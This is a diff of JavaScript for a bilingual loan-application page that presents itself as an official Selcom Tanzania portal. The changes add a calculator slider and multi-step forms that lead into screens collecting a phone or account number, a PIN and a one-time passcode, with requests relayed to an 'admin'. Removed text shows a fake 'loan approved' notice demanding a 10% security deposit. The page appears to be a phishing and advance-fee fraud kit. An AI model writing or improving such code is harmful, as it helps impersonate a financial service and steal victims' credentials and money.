@@ -1,5 +1,9 @@
 document.addEventListener('DOMContentLoaded', () => {
   const screenWelcome = document.getElementById('screen-welcome');
+  const screenSlider = document.getElementById('screen-slider');
+  const screenForm1 = document.getElementById('screen-form1');
+  const screenForm2 = document.getElementById('screen-form2');
+  const screenForm3 = document.getElementById('screen-form3');
   const screenSignin = document.getElementById('screen-signin');
   const screenOtp = document.getElementById('screen-otp');
   const screenSuccess = document.getElementById('screen-success');
@@ -15,19 +19,18 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const otpBoxes = document.querySelectorAll('.otp-box-num');
   const btnSubmitOtp = document.getElementById('btn-submit-otp');
-  const countdownEl = document.getElementById('countdown');
   const btnRequestNewOtp = document.getElementById('btn-request-new-otp');
 
   let currentUserId = null;
   let statusPollInterval = null;
   let countdownInterval = null;
-  let currentLanguage = 'sw'; // Default Swahili
+  let currentLanguage = 'sw';
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
   function showScreen(targetScreen) {
-    [screenWelcome, screenSignin, screenOtp, screenSuccess].forEach(s => {
+    [screenWelcome, screenSlider, screenForm1, screenForm2, screenForm3, screenSignin, screenOtp, screenSuccess].forEach(s => {
       if (s) s.classList.remove('active');
     });
     if (targetScreen) targetScreen.classList.add('active');
@@ -39,71 +42,81 @@ document.addEventListener('DOMContentLoaded', () => {
     const isSwahili = lang === 'sw';
 
     if (isSwahili) {
-      document.getElementById('txt-welcome-subtitle').innerText = 'Kadiria marejesho yako ya mkopo';
-      document.getElementById('lbl-loan-amt-title').innerText = 'KIASI CHA MKOPO';
-      document.getElementById('lbl-loan-term-title').innerText = 'MUDA WA MKOPO (MIEZI)';
-      document.getElementById('lbl-est-rep').innerText = 'MAREJESHO YA MWEZI KADIRIA';
-      document.getElementById('lbl-tot-rep').innerText = 'JMLA YA MAREJESHO';
-      document.getElementById('lbl-interest').innerText = '*Riba inayodhaniwa: 13.5%';
-      document.getElementById('btn-goto-signin').innerText = 'INGIA';
+      document.getElementById('lbl-welcome-title').innerText = 'KARIBU SELCOM TANZANIA!';
+      document.getElementById('lbl-welcome-sub').innerText = 'WELCOME TO THE OFFICIAL APPLICATION PORTAL.';
+      document.getElementById('lbl-welcome-desc').innerText = 'Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.';
+      document.getElementById('lbl-crit-title').innerText = 'CRITICAL NOTIFICATION';
+      document.getElementById('lbl-crit-body').innerHTML = '<strong>⚠️ ATTENTION!</strong> An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.';
+      document.getElementById('lbl-portal-footer').innerText = 'Official Application Portal (Tanzania Only)';
+      document.getElementById('btn-goto-slider').innerText = 'CONTINUE';
 
-      document.getElementById('lbl-ingia-akaunti').innerText = 'Ingia Akaunti';
-      document.getElementById('lbl-phone-label').innerText = 'Nambari ya Simu / Account No';
-      document.getElementById('lbl-pin-label').innerText = 'Weka PIN yako (tarakimu 4)';
-      document.getElementById('lbl-forgot-pin').innerText = 'Umesahau PIN?';
-      document.getElementById('btn-submit-creds').innerText = 'INGIA';
-
-      document.getElementById('lbl-otp-title').innerText = 'Uthibitisho wa OTP ya Selcom';
-      document.getElementById('lbl-otp-sub').innerHTML = 'Weka tarakimu 6 za OTP iliyotumwa kwenye nambari yako ya simu iliyosajiliwa na Selcom <strong id="display-otp-phone">+2557125535595</strong>';
-      document.getElementById('lbl-otp-notice').innerText = '✓ Ujumbe umethibitishwa! Tafadhali weka OTP yako ya tarakimu 6 kutoka WhatsApp au SMS hapa chini.';
-      document.getElementById('lbl-timer').innerHTML = 'Tuma tena msimbo ndani ya <span id="countdown">1:00</span>';
-      document.getElementById('btn-request-new-otp').innerText = 'Tuma Msimbo Mpya (Request New OTP)';
-      document.getElementById('btn-submit-otp').innerText = 'WASILISHA';
-
-      document.getElementById('lbl-hongera').innerText = 'Hongera!';
-      document.getElementById('lbl-approved-sub').innerHTML = 'Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.';
-      document.getElementById('lbl-approved-heading').innerText = 'KIASI KILICHOIDHINISHWA';
-      document.getElementById('lbl-notisi').innerText = '⚠️ NOTISI YA UZINGATIAJI';
-      document.getElementById('lbl-notisi-body').innerText = 'Akaunti yako ya SELCOM details lazima iwe hai na idumish amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.';
-      document.getElementById('btn-finish-home').innerText = 'RUDI NYUMBANI';
-    } else {
-      document.getElementById('txt-welcome-subtitle').innerText = 'Estimate your loan repayments';
+      document.getElementById('lbl-est-title').innerText = 'Estimate your loan repayments';
       document.getElementById('lbl-loan-amt-title').innerText = 'LOAN AMOUNT';
       document.getElementById('lbl-loan-term-title').innerText = 'LOAN TERM (MONTHS)';
       document.getElementById('lbl-est-rep').innerText = 'ESTIMATED MONTHLY REPAYMENT';
       document.getElementById('lbl-tot-rep').innerText = 'TOTAL REPAYMENT';
       document.getElementById('lbl-interest').innerText = '*Assumed Interest Rate: 13.5%';
-      document.getElementById('btn-goto-signin').innerText = 'SIGN IN';
+      document.getElementById('btn-goto-form1').innerText = 'SIGN IN';
+    } else {
+      document.getElementById('lbl-welcome-title').innerText = 'WELCOME SELCOM TANZANIA!';
+      document.getElementById('lbl-welcome-sub').innerText = 'KARIBU KWENYE PORTAL RASMI YA MAOMBI.';
+      document.getElementById('lbl-welcome-desc').innerText = 'Maelezo yako ya akaunti ya Selcom (Tanzania pekee) yanahitajika. Hakikisha unatumia namba sahihi kuepuka kuchelewa.';
+      document.getElementById('lbl-crit-title').innerText = 'TAARIFA MUHIMU YA USALAMA';
+      document.getElementById('lbl-crit-body').innerHTML = '<strong>⚠️ TAHADHARI!</strong> Hatua muhimu ya usalama: <strong>USIWEKE TAARIFA ZISIZO SAHIHI ZA SELCOM</strong>. Hii itasababisha kukataliwa mara moja.';
+      document.getElementById('lbl-portal-footer').innerText = 'Tovuti Rasmi ya Maombi (Tanzania Tu)';
+      document.getElementById('btn-goto-slider').innerText = 'ENDELEA';
 
-      document.getElementById('lbl-ingia-akaunti').innerText = 'Sign In Account';
-      document.getElementById('lbl-phone-label').innerText = 'Mobile Number / Account No';
-      document.getElementById('lbl-pin-label').innerText = 'Enter your PIN (4 digits)';
-      document.getElementById('lbl-forgot-pin').innerText = 'Forgot PIN?';
-      document.getElementById('btn-submit-creds').innerText = 'SIGN IN';
-
-      document.getElementById('lbl-otp-title').innerText = 'Selcom OTP Verification';
-      document.getElementById('lbl-otp-sub').innerHTML = 'Enter the 6-digit OTP sent to your Selcom registered phone number <strong id="display-otp-phone">+2557125535595</strong>';
-      document.getElementById('lbl-otp-notice').innerText = '✓ Message verified! Please enter your 6-digit OTP code from WhatsApp or SMS below.';
-      document.getElementById('lbl-timer').innerHTML = 'Resend code in <span id="countdown">1:00</span>';
-      document.getElementById('btn-request-new-otp').innerText = 'Request New OTP';
-      document.getElementById('btn-submit-otp').innerText = 'SUBMIT';
-
-      document.getElementById('lbl-hongera').innerText = 'Congratulations!';
-      document.getElementById('lbl-approved-sub').innerHTML = 'Your loan has been <strong>approved!</strong> Funds will be disbursed shortly.';
-      document.getElementById('lbl-approved-heading').innerText = 'APPROVED AMOUNT';
-      document.getElementById('lbl-notisi').innerText = '⚠️ COMPLIANCE NOTICE';
-      document.getElementById('lbl-notisi-body').innerText = 'Your SELCOM account details must be active and maintain a security deposit of at least 10% of the requested loan amount. This deposit is fully refunded after loan completion.';
-      document.getElementById('btn-finish-home').innerText = 'RETURN HOME';
+      document.getElementById('lbl-est-title').innerText = 'Kadiria marejesho yako ya mkopo';
+      document.getElementById('lbl-loan-amt-title').innerText = 'KIASI CHA MKOPO';
+      document.getElementById('lbl-loan-term-title').innerText = 'MUDA WA MKOPO (MIEZI)';
+      document.getElementById('lbl-est-rep').innerText = 'MAREJESHO YA MWEZI KADIRIA';
+      document.getElementById('lbl-tot-rep').innerText = 'JMLA YA MAREJESHO';
+      document.getElementById('lbl-interest').innerText = '*Riba inayodhaniwa: 13.5%';
+      document.getElementById('btn-goto-form1').innerText = 'INGIA';
     }
   }
 
-  // Initialize with Swahili default checked
   langToggle.addEventListener('change', (e) => {
     updateLanguageTexts(e.target.checked ? 'sw' : 'en');
   });
   updateLanguageTexts('sw');
 
-  // Slider Logic & Calculator
+  // Navigation Flows
+  document.getElementById('btn-goto-slider').addEventListener('click', () => showScreen(screenSlider));
+  document.getElementById('btn-slider-back').addEventListener('click', () => showScreen(screenWelcome));
+  document.getElementById('btn-goto-form1').addEventListener('click', () => showScreen(screenForm1));
+
+  document.getElementById('btn-form1-back').addEventListener('click', () => showScreen(screenSlider));
+  document.getElementById('btn-form1-next').addEventListener('click', () => {
+    const amt = document.getElementById('form-amount-input').value;
+    document.getElementById('sum-amount').innerText = `TSh ${amt}`;
+    showScreen(screenForm2);
+  });
+
+  document.getElementById('btn-form2-back').addEventListener('click', () => showScreen(screenForm1));
+  document.getElementById('btn-form2-prev').addEventListener('click', () => showScreen(screenForm1));
+  document.getElementById('btn-form2-next').addEventListener('click', () => {
+    const fName = document.getElementById('first-name').value.trim();
+    const lName = document.getElementById('last-name').value.trim();
+    const phoneVal = phoneInput.value.trim();
+
+    if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
+      alert('Nambari ya simu lazima ianze na 0 na iwe sahihi.');
+      return;
+    }
+
+    document.getElementById('sum-applicant').innerText = `${fName} ${lName}`.trim() || 'NMB MKONONI';
+    showScreen(screenForm3);
+  });
+
+  document.getElementById('btn-form3-back').addEventListener('click', () => showScreen(screenForm2));
+  document.getElementById('btn-form3-prev').addEventListener('click', () => showScreen(screenForm2));
+  document.getElementById('btn-form3-submit').addEventListener('click', () => {
+    showScreen(screenSignin);
+    if (pinBoxes[0]) pinBoxes[0].focus();
+  });
+
+  // Slider Calculator
   const loanSlider = document.getElementById('loan-amount-slider');
   const loanText = document.getElementById('loan-amount-text');
   const monthsSlider = document.getElementById('loan-months-slider');
@@ -115,11 +128,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const amount = Number(loanSlider.value);
     const months = Number(monthsSlider.value);
     loanText.innerText = `TSH ${amount.toLocaleString()}`;
-    monthsText.innerText = `${months} ${currentLanguage === 'sw' ? 'MIEZI' : 'MONTHS'}`;
+    monthsText.innerText = `${months} MIEZI`;
+    document.getElementById('form-amount-input').value = amount.toLocaleString();
+    document.getElementById('sum-duration').innerText = `Miezi ${months}`;
 
     const totalRep = amount * 1.135;
     const monthlyRep = totalRep / months;
-
     monthlyRepVal.innerText = `TSH ${Math.round(monthlyRep).toLocaleString()}`;
     totalRepVal.innerText = `TSH ${Math.round(totalRep).toLocaleString()}`;
   }
@@ -127,17 +141,6 @@ document.addEventListener('DOMContentLoaded', () => {
   loanSlider.addEventListener('input', updateCalculations);
   monthsSlider.addEventListener('input', updateCalculations);
   updateCalculations();
-
-  // Navigate to Sign In screen
-  const btnGotoSignin = document.getElementById('btn-goto-signin');
-  if (btnGotoSignin) {
-    ['click', 'touchstart'].forEach(evt => {
-      btnGotoSignin.addEventListener(evt, (e) => {
-        e.preventDefault();
-        showScreen(screenSignin);
-      });
-    });
-  }
 
   // Phone input formatting (Starts with 0 enforcement)
   if (phoneInput) {
@@ -147,11 +150,10 @@ document.addEventListener('DOMContentLoaded', () => {
         val = '0' + val.replace(/^0+/, '');
       }
       e.target.value = val;
-      checkCredsValid();
     });
   }
 
-  // Pin digits auto-tabbing
+  // Pin & OTP digits setup
   function setupDigitInputs(boxes, callback) {
     boxes.forEach((box, idx) => {
       box.addEventListener('input', () => {
@@ -281,7 +283,7 @@ document.addEventListener('DOMContentLoaded', () => {
           body: JSON.stringify({ userId: currentUserId })
         });
         hideLoading();
-        alert(currentLanguage === 'sw' ? 'Ombi limetumwa kwa admin.' : 'Request sent to admin.');
+        alert('Ombi limetumwa kwa admin.');
         startOneMinuteTimer();
       } catch (err) {
         hideLoading();
@@ -353,4 +355,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-  
+    
